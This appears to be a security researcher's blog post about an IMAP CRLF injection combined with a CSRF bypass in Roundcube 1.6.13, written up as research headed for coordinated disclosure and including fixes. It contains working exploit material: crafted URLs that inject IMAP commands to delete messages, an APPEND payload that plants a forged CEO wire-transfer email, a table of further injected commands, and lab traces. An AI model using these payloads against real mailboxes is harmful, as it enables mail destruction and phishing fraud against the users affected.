---
title: "Single-Click Email Planting: IMAP CRLF Injection + CSRF in Roundcube"
excerpt: "How a forgotten 'skip empty requests' branch in Roundcube's CSRF check let one crafted link delete or plant emails in a logged-in user's mailbox — found over a weekend pair-programming run with Claude Opus 4.6."
date: "2026-02-23"
category: "cybersecurity"
author: "yup.eng"
image: "/blogBanner/brainBanner.png"
---

## The Background
A quiet weekend rolled around and I had a couple of free evenings, so I sat down with Claude Opus 4.6 to do variant analysis on Roundcube. The backstory is CVE-2025-49113 — the FearsOff finding from earlier this year that turned a single GET parameter into a PHP object deserialization gadget chain via Roundcube's session handler. The specific vector got patched, but the *shape* of the bug — user input flowing into a sink that was never expecting it — felt like the kind of pattern that rarely shows up only once in a codebase.

I cloned `1.6.13`, spun up a docker lab with Dovecot, and started feeding sources, sinks, and grep results into Opus while it walked through each candidate with me. Most of the leads went nowhere. One of them did not.

## The Hunt
The thing that caught my eye was `program/actions/mail/search.php`. The `_filter` GET parameter was being read with `rcube_utils::get_input_string()` and then handed straight to the IMAP `SEARCH` command:

```php
$filter = rcube_utils::get_input_string('_filter', rcube_utils::INPUT_GET);
// ...
$search_str = $filter && $filter != 'ALL' ? $filter : '';
```

`get_input_string()` runs `strip_tags()` and a couple of other niceties — but it preserves CRLF. The IMAP client serialises commands with `putLineC()`, which means anything before a `\r\n` gets sent as a separate command on the wire. That looked promising. I poked it with `_filter=ALL%0d%0aT77 NOOP` and watched the second line land cleanly in the IMAP socket trace as its own command.

Working IMAP injection. But it required hitting an authenticated endpoint, which is exactly what the CSRF token is supposed to gate. So the next question was whether I could actually fire this from someone else's browser. I expected to bounce off `check_request()`. I did not.

```php
public function check_request($mode = rcube_utils::INPUT_POST)
{
    // ...
    if (($mode == rcube_utils::INPUT_POST && empty($_POST))
        || ($mode == rcube_utils::INPUT_GET && empty($_GET))
    ) {
        return true;
    }
    // ...
}
```

The default mode is `INPUT_POST`, and `index.php` calls `check_request()` with the default. `$_POST` is always empty on a GET request, so the "skip empty requests" early-return fires *unconditionally* for every GET. The token is never checked. The `_remote=1` parameter — Roundcube's "this is an AJAX request" flag — is enough to satisfy the dispatcher elsewhere.

So the chain is: a logged-in victim, a single link, a CSRF check that returns `true` without checking anything, and an unsanitised parameter going straight into the IMAP command stream. No JavaScript, no XSS chain, no token theft.

## The Application
The first thing I tried was destructive deletion:

```
https://target/?_task=mail&_action=search&_remote=1&_mbox=INBOX
  &_filter=ALL%0d%0aT77 UID STORE 1 +FLAGS (\Deleted)%0d%0aT78 EXPUNGE
```

URL-decoded, the `_filter` parameter looks like:

```
ALL\r\n
T77 UID STORE 1 +FLAGS (\Deleted)\r\n
T78 EXPUNGE
```

Lab IMAP trace:

```
C: A0004 UID SEARCH RETURN (ALL) ALL
   T77 UID STORE 1 +FLAGS (\Deleted)
   T78 EXPUNGE
S: * ESEARCH (TAG "A0004") UID ALL 2:28
S: * 1 EXPUNGE
S: T77 OK Store completed
S: T78 OK Expunge completed
```

Messages before: 28. Messages after: 27. Click a link, lose a message. Swap `STORE 1` for `STORE 1:*` followed by `EXPUNGE` and every message in the folder goes the same way.

The more interesting payload was email planting via `APPEND` with `LITERAL+`:

```
T77 APPEND INBOX {221+}\r\n
From: ceo@company.com\r\n
To: user@host\r\n
Subject: URGENT: Wire Transfer Required\r\n
Content-Type: text/plain\r\n
\r\n
Please wire 50000 to account 12345678 immediately.
This is time-sensitive. Do not discuss with anyone.\r\n
\r\n
T78 NOOP
```

`LITERAL+` lets the client send the literal length and the body in a single pipelined write — no server `+` continuation needed — so the whole APPEND fits inside one HTTP request. Lab confirmed: 33 messages before, 34 after, with a forged email from "the CEO" sitting in the victim's inbox in their own folder, indistinguishable at the IMAP layer from anything Dovecot would have received over SMTP.

There is one annoying constraint. `get_input_string()` runs `strip_tags()`, which means `<>` characters are silently removed from the parameter before the bytes reach the IMAP layer. The `{N+}` literal byte count has to match the *post-strip* body, so any header like `<user@host>` either has to be rewritten as `user@host` or the byte count has to compensate. I lost about an hour to that one before I noticed.

The full table of what an attacker can do here, given a click and a logged-in session:

| Payload | Impact |
|---|---|
| `STORE 1:* +FLAGS (\Deleted)` + `EXPUNGE` | Delete every message in a folder |
| `APPEND INBOX {N+}` (LITERAL+) | **Plant a forged email** — phishing, social engineering, evidence |
| `STORE 1:* +FLAGS (\Seen)` / `-FLAGS (\Seen)` | Mass-toggle read state |
| `COPY 1:* "Trash"` | Move messages out of view |
| `RENAME INBOX "Archived"` | Rename the user's mailbox |
| `SELECT user/otheruser/INBOX` (shared servers) | Reach into another user's mailbox |

CVSS is honestly debatable. I scored it `6.5 (HIGH)` — `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`. The integrity impact is real (forged emails, deleted mail), the user interaction is the only saving grace, and confidentiality/availability are situational depending on what the attacker decides to inject.

## The Conclusion
Two roots, both very ordinary:

1. A parameter intended for trusted JS-set values (`UNSEEN`, `FLAGGED`, `SINCE 01-Jan-2024`) was treated as trusted because the JS UI happens to be the only legitimate caller. The IMAP layer doesn't escape CRLF because the assumption is that nothing upstream will let it through.
2. A "skip empty requests" branch in CSRF validation, designed for pages that don't submit a body, fires on every GET request — including AJAX ones tagged with `_remote=1`. The token is never consulted.

The fixes are small in both cases: strip CRLF from `_filter` (or whitelist it against the actual set of legitimate filter keywords), and don't return `true` from `check_request()` for AJAX calls without verifying the request token. I'm sending this to the Roundcube security team as I write this; I'll update once disclosure runs its course.

The other lesson, less technical: **variant analysis works**. CVE-2025-49113 was about a *session key* being borrowed from user input. This one is about an *IMAP command* being borrowed from user input. Different sink, same shape — "trusted-by-convention input flowing into a context that demands validation". The pattern is the same; the question is just whether you have the patience to look for it everywhere it might exist.

Pairing with Opus 4.6 made that patience cheap. I'd describe the working mode as "I read code, it grep'd for ten things at once, both of us flagged anything weird." Most of the leads were dead ends. The one that wasn't paid for the weekend.
